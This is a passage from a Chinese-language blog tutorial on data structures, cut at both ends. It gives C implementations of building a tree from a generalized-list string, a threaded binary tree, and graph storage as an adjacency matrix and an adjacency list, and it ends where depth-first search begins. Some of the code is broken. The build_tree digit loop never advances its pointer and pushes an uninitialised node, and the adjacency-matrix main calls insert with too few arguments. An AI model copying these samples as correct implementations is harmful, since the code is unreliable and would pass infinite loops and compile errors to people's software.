class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...<br><span class="hljs-comment">// 上接树的实现    </span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">// 栈处理广义表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stack</span> &#123;</span><br>    Node **elements;<br>    <span class="hljs-keyword">int</span> max_size, top_index;<br>&#125; Stack;<br><br><span class="hljs-function">Stack *<span class="hljs-title">init_stack</span><span class="hljs-params">(<span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    Stack *s = (Stack *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Stack));<br>    s-&gt;elements = (Node **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node *) * length);<br>    s-&gt;max_size = length;<br>    s-&gt;top_index = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeStack</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!s) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">free</span>(s-&gt;elements);<br>    <span class="hljs-built_in">free</span>(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">push</span><span class="hljs-params">(Stack *s, Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!s) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (s-&gt;top_index == s-&gt;max_size - <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    s-&gt;elements[++s-&gt;top_index] = n;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">is_empty</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> !(s &amp;&amp; s-&gt;top_index != <span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-function">Node *<span class="hljs-title">pop</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> s-&gt;elements[s-&gt;top_index--];<br>&#125;<br><br><span class="hljs-function">Node *<span class="hljs-title">build_tree</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    Stack *s = init_stack(<span class="hljs-number">100</span>);<br>    Node *root, *n;<br>    <span class="hljs-keyword">int</span> flag = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span>(str[<span class="hljs-number">0</span>]) &#123;<br>        <span class="hljs-keyword">switch</span> (str[<span class="hljs-number">0</span>]) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'('</span>:<br>                push(s, n);<br>                flag = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">','</span>:<br>                flag = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">')'</span>:<br>                root = pop(s);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">if</span> (str[<span class="hljs-number">0</span>] &lt; <span class="hljs-string">'0'</span> || str[<span class="hljs-number">0</span>] &gt; <span class="hljs-string">'9'</span>) <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">int</span> num = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">while</span> (str[<span class="hljs-number">0</span>] &gt;= <span class="hljs-string">'0'</span> &amp;&amp; str[<span class="hljs-number">0</span>] &lt;= <span class="hljs-string">'9'</span>) &#123;<br>                    num = num * <span class="hljs-number">10</span> + (str[<span class="hljs-number">0</span>] - <span class="hljs-string">'0'</span>);<br>                &#125;<br>                str--;<br>                n = init(num);<br><br>                <span class="hljs-keyword">if</span> (!is_empty(s))<br>                    flag ? (s-&gt;elements[s-&gt;top_index]-&gt;rchild = n) : \<br>                           (s-&gt;elements[s-&gt;top_index]-&gt;lchild = n);<br>        &#125;<br>        ++str;<br>    &#125;<br><br>    freeStack(s);<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="线索二叉树">线索二叉树</span></h3><p>利用叶子节点的空指针，建立所需要的前驱后继结构。比如下面实现中序遍历的前驱后继。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-comment">// ltag 和 rtag 表示节点的左右孩子是普通孩子节点还是前驱后继节点。</span><br><span class="hljs-comment">// 前驱后继节点，将叶子节点的空指针孩子指向中序遍历的前驱后继节点。</span><br><span class="hljs-keyword">enum</span> &#123;<br>    CHILD = <span class="hljs-number">0</span>,<br>    THREAD = <span class="hljs-number">1</span><br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">lchild</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">rchild</span>;</span><br>    <span class="hljs-keyword">int</span> rtag, ltag;<br>&#125; Node;<br><br><span class="hljs-function">Node *<span class="hljs-title">initNode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    n-&gt;val = val;<br>    n-&gt;lchild = <span class="hljs-literal">NULL</span>;<br>    n-&gt;rchild = <span class="hljs-literal">NULL</span>;<br>    n-&gt;ltag = CHILD;<br>    n-&gt;rtag = CHILD;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeNode</span><span class="hljs-params">(Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!n) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">free</span>(n);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">Node *<span class="hljs-title">insert</span><span class="hljs-params">(Node *root, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!root) <span class="hljs-keyword">return</span> initNode(val);<br>    <span class="hljs-keyword">if</span> (val &gt; root-&gt;val)<br>        root-&gt;rchild = insert(root-&gt;rchild, val);<br>    <span class="hljs-keyword">else</span><br>        root-&gt;lchild = insert(root-&gt;lchild, val);<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeTree</span><span class="hljs-params">(Node *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!root) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (root-&gt;rtag == CHILD)<br>        freeTree(root-&gt;rchild);<br>    <span class="hljs-keyword">if</span> (root-&gt;ltag == CHILD)<br>        freeTree(root-&gt;lchild);<br>    freeNode(root);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inorder</span><span class="hljs-params">(Node *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!root) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (root-&gt;ltag == CHILD)<br>        inorder(root-&gt;lchild);<br>    <span class="hljs-keyword">if</span> (root-&gt;rtag == CHILD)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, root-&gt;val);<br>    inorder(root-&gt;rchild);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-comment">// 线索二叉树</span><br>Node *pre = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// 类似inordoer的遍历方法，同时更新叶子节点的前驱和后继</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">build_thread_tree</span><span class="hljs-params">(Node *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!root) <span class="hljs-keyword">return</span>;<br><br>    build_thread_tree(root-&gt;lchild);<br><br>    <span class="hljs-comment">// 更新当前节点（叶子节点）的前驱，及前驱节点的后继。</span><br>    <span class="hljs-keyword">if</span> (root-&gt;lchild == <span class="hljs-literal">NULL</span>) &#123;<br>        root-&gt;lchild = pre;<br>        root-&gt;ltag = THREAD;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pre &amp;&amp; !pre-&gt;rchild) &#123;<br>        pre-&gt;rchild = root;<br>        pre-&gt;rtag = THREAD;<br>    &#125;<br>    pre = root;<br><br>    build_thread_tree(root-&gt;rchild);<br>&#125;<br><br><span class="hljs-function">Node *<span class="hljs-title">getLeftMost</span><span class="hljs-params">(Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (n &amp;&amp; n-&gt;ltag == CHILD &amp;&amp; n-&gt;lchild)<br>        n = n-&gt;lchild;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(Node *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!root) <span class="hljs-keyword">return</span>;<br>    Node *n = getLeftMost(root);<br>    <span class="hljs-keyword">while</span> (n) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, n-&gt;val);<br>        <span class="hljs-keyword">if</span> (n-&gt;rtag == CHILD)<br>            n = getLeftMost(n-&gt;rchild);  <span class="hljs-comment">// 非叶子节点，符合中序遍历</span><br>        <span class="hljs-keyword">else</span><br>            n = n-&gt;rchild; <span class="hljs-comment">// 后继</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    srand(time(<span class="hljs-literal">NULL</span>));<br>    Node *root = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">10</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Input         : "</span>);<br>    <span class="hljs-keyword">while</span> (cnt--) &#123;<br>        <span class="hljs-keyword">int</span> val = rand() % <span class="hljs-number">100</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, val);<br>        root = insert(root, val);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Inorder output: "</span>);<br>    inorder(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Thread output : "</span>);<br>    build_thread_tree(root);<br>    output(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br><br>    freeTree(root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="图">图</span></h2><p>一个图有很少边（如 <span class="math inline">\(e &lt; n\log(n)\)</span>，<em>e</em> 指边数，<em>n</em>指点数）的图称为稀疏图，反之称为稠密图。</p><p>顶点的 <strong>度</strong> 是指依附于某个顶点的边数。</p><p><strong>入度</strong>是以该顶点为终点的弧的数目，<strong>出度</strong>是以该顶点为起点的弧的数目。</p><p>稀疏图，一般用邻接表来存储，这样可以节省空间；如果是稠密图，一般用邻接矩阵来存储。</p><h3><span id="邻接矩阵">邻接矩阵</span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_N 500</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Graph</span> &#123;</span><br>    <span class="hljs-keyword">int</span> mat[MAX_N][MAX_N];<br>    <span class="hljs-keyword">int</span> n;<br>&#125; Graph;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    g-&gt;n = n;<br>    <span class="hljs-built_in">memset</span>(g-&gt;mat, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(g-&gt;mat));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= g-&gt;n || y &lt; <span class="hljs-number">0</span> || y &gt;= g-&gt;n) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a) &#123;<br>        g-&gt;mat[x][y] = <span class="hljs-number">1</span>;<br>        g-&gt;mat[y][x] = <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        g-&gt;mat[x][y] = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(Graph *g)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;n; ++j) &#123;<br>            (j) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, g-&gt;mat[i][j]);<br>        &#125;<br>        (i &lt; g-&gt;n - <span class="hljs-number">1</span>) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, m, x, y;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;n, &amp;m);<br>    Graph *graph = (Graph *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Graph));<br>    init(graph, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;x, &amp;y);<br>        insert(graph, x, y);<br>    &#125;<br>    output(graph);<br>    <span class="hljs-built_in">free</span>(graph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="邻接表">邻接表</span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_N 10000</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> vertex;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125; Node, *LinkedList;<br><br><span class="hljs-function">LinkedList <span class="hljs-title">insert_node</span><span class="hljs-params">(LinkedList head, <span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    Node *node = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    node-&gt;vertex = index;<br>    node-&gt;next = head;<br>    head = node;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Graph</span> &#123;</span><br>    <span class="hljs-keyword">int</span> n;<br>    LinkedList edges[MAX_N];<br>&#125; Graph;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    g-&gt;n = n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        g-&gt;edges[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= g-&gt;n || y &lt; <span class="hljs-number">0</span> || y &gt;= g-&gt;n) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a) &#123;<br>        g-&gt;edges[x] = insert_node(g-&gt;edges[x], y);<br>        g-&gt;edges[y] = insert_node(g-&gt;edges[y], x);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        g-&gt;edges[x] = insert_node(g-&gt;edges[x], y);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(Graph *g)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d:"</span>, i);<br>        <span class="hljs-keyword">for</span> (Node *j = g-&gt;edges[i]; j != <span class="hljs-literal">NULL</span>; j = j-&gt;next) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">" %d"</span>, j-&gt;vertex);<br>        &#125;<br>        (i &lt; g-&gt;n - <span class="hljs-number">1</span>) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Graph *g)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        Node *head = g-&gt;edges[i];<br>        <span class="hljs-keyword">while</span> (head != <span class="hljs-literal">NULL</span>) &#123;<br>            Node *delete_node = head;<br>            head = head-&gt;next;<br>            <span class="hljs-built_in">free</span>(delete_node);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(g);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, m, a, x, y;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;n, &amp;m);<br>    Graph *graph = (Graph *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Graph));<br>    init(graph, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d %d"</span>, &amp;a, &amp;x, &amp;y);<br>        insert(graph, a, x, y);<br>    &#125;<br>    output(graph);<br>    <span class="hljs-built_in">clear</span>(graph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="图搜索">图搜索</span></h3><h4><span id="深度优先">深度优先</span></h4><p>从开始节点，遍历相邻节点，若该节点没有被访问过，递归遍历其相邻节点。遇到没有遍历的，就向下递归。</p><p>利用邻接表实现DFS</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code 